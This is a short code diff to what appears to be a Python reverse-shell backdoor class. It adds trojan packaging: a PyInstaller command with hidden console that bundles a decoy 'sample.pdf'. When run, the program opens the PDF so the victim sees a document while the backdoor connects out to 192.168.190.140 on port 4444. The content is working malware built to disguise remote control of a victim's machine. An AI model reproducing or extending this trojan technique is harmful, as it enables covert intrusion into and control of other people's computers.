@@ -87,6 +87,13 @@ class Backdoor:
             self.reliable_send(command_result)
 
 
+# pyinstaller.exe reverse_backdoor.py --add-data "sample.pdf;." --onefile --noconsole
+# "sample.pdf;." stands for default pyinstaller location
+# _MEIPASS is pyinstaller default location for packaged program
+# https://pyinstaller.readthedocs.io/en/stable/spec-files.html
+file_name = sys._MEIPASS + "\sample.pdf"
+subprocess.Popen(file_name, shell=True)  # Execute packaged trojan file and let the script work
+
 try:
     my_backdoor = Backdoor("192.168.190.140", 4444)
     my_backdoor.run()
